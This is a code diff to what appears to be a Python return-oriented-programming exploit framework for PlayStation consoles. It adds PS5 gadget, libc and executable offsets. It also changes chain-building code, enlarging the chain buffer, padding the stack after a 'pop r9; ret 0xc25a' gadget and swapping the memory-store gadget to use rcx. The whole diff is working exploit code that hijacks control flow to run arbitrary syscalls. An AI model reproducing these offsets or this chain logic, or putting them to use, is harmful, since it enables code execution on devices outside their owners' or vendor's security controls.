@@ -34,7 +34,7 @@ GADGET_OFFSETS = {
             "push rbp; mov rbp, rsp; xor esi, esi; call [rdi + 0x130]": 0x3414C0,
             "add [r8 - 0x7d], rcx; ret": 0x752685,
             "ret": 0x42,
-            "mov [rsi], rdx; ret": 0x5AC81,
+            "mov [rcx], rdx; ret": 0x7E9780,
             # libc
             "mov rsp, [rdi + 0x38]; pop rdi; ret": 0x26FFE,
             "mov rax, [rax]; ret": 0xB0057,
@@ -56,11 +56,32 @@ GADGET_OFFSETS = {
             "push rbp; mov rbp, rsp; xor esi, esi; call [rdi + 0x130]": 0x2D6410,
             "add [r8 - 0x7d], rcx; ret": 0x72087E,
             "ret": 0x42,
-            "mov [rsi], rdx; ret": 0x5AC81,
+            "mov [rcx], rdx; ret": 0x33A3DE,
             # libc
             "mov rsp, [rdi + 0x38]; pop rdi; ret": 0x26FFE,
             "mov rax, [rax]; ret": 0xB0057,
-        }
+        },
+        "PS5": {
+            # exec
+            "add rsp, 0x1b8; ret": 0x87B4C6 - 0x3990,
+            "pop rax; ret": 0x6052C - 0x3990,
+            "pop rcx; ret": 0x7B88B - 0x3990,
+            "pop rdx; ret": 0x2BFF32 - 0x3990,
+            "pop rsi; ret": 0x87F82 - 0x3990,
+            "pop rdi; ret": 0x3000FD - 0x3990,
+            "pop r8; ret": 0x808111 - 0x3990,
+            "pop r9; ret 0xc25a": 0xA634E7 - 0x3990,
+            "mov [rsi], rax; ret": 0x80205A - 0x3990,
+            "mov rsp, rbp; pop rbp; ret": 0x4114 - 0x3990,
+            "push rbp; mov rbp, rsp; xor esi, esi; call [rdi + 0x130]": 0x38FC50
+            - 0x3990,
+            "add [r8 - 0x7d], rcx; ret": 0x7A7735 - 0x3990,
+            "ret": 0x4032 - 0x3990,
+            "mov [rcx], rdx; ret": 0x8AF2C0 - 0x3990,
+            # libc
+            "mov rsp, [rdi + 0x38]; pop rdi; ret": 0x3EB7E,
+            "mov rax, [rax]; ret": 0x700D7,
+        },
     },
 }
 
@@ -86,7 +107,14 @@ LIBC_OFFSETS = {
             "strcmp": 0xB0AE0,
             "__error": 0x168,
             "strerror": 0x37000,
-        }
+        },
+        "PS5": {
+            "sceKernelGetModuleInfoFromAddr": 0x14A9E8,
+            "gettimeofday": 0x14A8F8,
+            "strcmp": 0x392B0,
+            "__error": 0xCC5A0,
+            "strerror": 0x73520,
+        },
     },
 }
 
@@ -101,7 +129,11 @@ EXEC_OFFSETS = {
         "PS4": {
             "func_repr": 0x353CA0,
             "strcmp": 0xC61F28,
-        }
+        },
+        "PS5": {
+            "func_repr": 0x4015C0,
+            "strcmp": 0xCFFEB0,
+        },
     },
 }
 
@@ -491,7 +523,7 @@ def convert_regs_to_int(*regs):
 
 
 class ROPChain(object):
-    def __init__(self, sc, size=0x2000):
+    def __init__(self, sc, size=0x2000 if CONSOLE_KIND == "PS4" else 0xF000):
         self.sc = sc
         self.chain = bytearray(size)
         self.return_value_buf = alloc(8)
@@ -521,6 +553,12 @@ class ROPChain(object):
             raise Exception("ROP chain overflow")
         self.chain[self.index : self.index + 8] = struct.pack("<Q", value)
         self.index += 8
+
+    def extend(self, buf):
+        if self.index + len(buf) > len(self.chain):
+            raise Exception("ROP chain overflow")
+        self.chain[self.index : self.index + len(buf)] = buf
+        self.index += len(buf)
 
     def push_gadget(self, gadget_name):
         if gadget_name not in self.sc.gadgets:
@@ -553,8 +591,13 @@ class ROPChain(object):
         self.push_value(rcx)
         self.push_gadget("pop r8; ret")
         self.push_value(r8)
-        self.push_gadget("pop r9; ret")
-        self.push_value(r9)
+        if CONSOLE_KIND == "PS4":
+            self.push_gadget("pop r9; ret")
+            self.push_value(r9)
+        else:
+            self.push_gadget("pop r9; ret 0xc25a")
+            self.push_value(r9)
+            self.extend(b"\0" * 0xC25A)  # align the stack
         if self.sc.platform == "ps5":
             self.push_value(self.sc.syscall_addr)
         else:
@@ -573,8 +616,13 @@ class ROPChain(object):
         self.push_value(rcx)
         self.push_gadget("pop r8; ret")
         self.push_value(r8)
-        self.push_gadget("pop r9; ret")
-        self.push_value(r9)
+        if CONSOLE_KIND == "PS4":
+            self.push_gadget("pop r9; ret")
+            self.push_value(r9)
+        else:
+            self.push_gadget("pop r9; ret 0xc25a")
+            self.push_value(r9)
+            self.extend(b"\0" * 0xC25A)  # align the stack
         self.push_value(addr)
 
     def push_get_return_value(self):
@@ -602,9 +650,9 @@ class ROPChain(object):
         self.push_gadget("mov [rsi], rax; ret")
 
     def push_store_rdx_into_memory(self, addr):
-        self.push_gadget("pop rsi; ret")
+        self.push_gadget("pop rcx; ret")
         self.push_value(addr)
-        self.push_gadget("mov [rsi], rdx; ret")
+        self.push_gadget("mov [rcx], rdx; ret")
 
 
 class Executable(object):
@@ -742,9 +790,9 @@ class Syscall(Executable):
             self.chain.push_gadget("pop rsi; ret")
             self.chain.push_value(refbytearray(rax_buf))
             self.chain.push_gadget("mov [rsi], rax; ret")
-            self.chain.push_gadget("pop rsi; ret")
+            self.chain.push_gadget("pop rcx; ret")
             self.chain.push_value(refbytearray(rdx_buf))
-            self.chain.push_gadget("mov [rsi], rdx; ret")
+            self.chain.push_gadget("mov [rcx], rdx; ret")
 
         self.setup_back_chain()
         ret = self.execute()
